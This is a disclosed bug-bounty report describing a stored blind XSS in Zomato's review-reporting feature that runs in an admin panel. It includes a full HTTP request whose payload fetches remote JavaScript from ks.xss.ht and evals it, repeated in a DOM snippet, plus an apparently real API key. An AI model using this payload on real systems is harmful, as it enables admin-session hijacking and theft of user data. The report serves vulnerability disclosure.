# Blind XSS - Report review - Admin panel

## Report Details
- **Report ID**: 314126
- **URL**: https://hackerone.com/reports/314126
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-09T08:29:03.069Z
- **Disclosed**: 2018-03-29T17:45:40.493Z

## Reporter
- **Username**: gerben_javado
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
#Introduction
In the Zomato Business app there is the functionality to report a review and give additional details as to why you did report the review. Because I knew this reason would be read by Zomato admins I did insert a blind XSS payload here, which ended up executing on https://www.zomato.com████████/reviews_new?review_id={ID}. This means that the content of additional details will be rendered as HTML on the admin panel page. The CSP policy of Zomato can be bypassed by leveraging the unsafe-inline in the CSP to load the JavaScript file using `XMLHttpRequest`.

#Steps to reproduce
1. Replace the `X-Access-Token` to your access token and the `review_id` to a review you can report.
2. Send the request in Burp
3. Go to https://www.zomato.com██████████/reviews_new?review_id={ID}
4. XSS payload executes

```http
POST /v2/█████merchant HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 485
Host: api.zomato.com
X-Zomato-API-Key: a2cf52f6036511e48be6b2227cce2b54
X-Access-Token: dc5da████████ad0fdddff04
X-Client-Id: zomato_merchantandroid_v2

reason_id=5&review_id=32288944&additional_text=<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

#Screenshot Admin Panel
{█████}

#Dom Snippet
```html
 <u>Reported by Merchant(ID)</u> : <a style="opacity: 1; color: #000000; text-decoration:underline" href="https://www.zomato.com/users/43211589">43211589</a><br><u>Report Reason ID</u> : 5 (Other (mention reason below).)<br><u>Additional Text</u> : H
H
H
H
H
''"&gt;<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

## Impact

An attacker is certain that a Zomato Admin will read his report. Thus an attacker can be sure that he can gain access to the Zomato admin panel where he can get the private information of other users by leveraging AJAX requests.

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://www.zomato.com██████████/reviews_new

**Verified**
Yes



## Attachments
No attachments
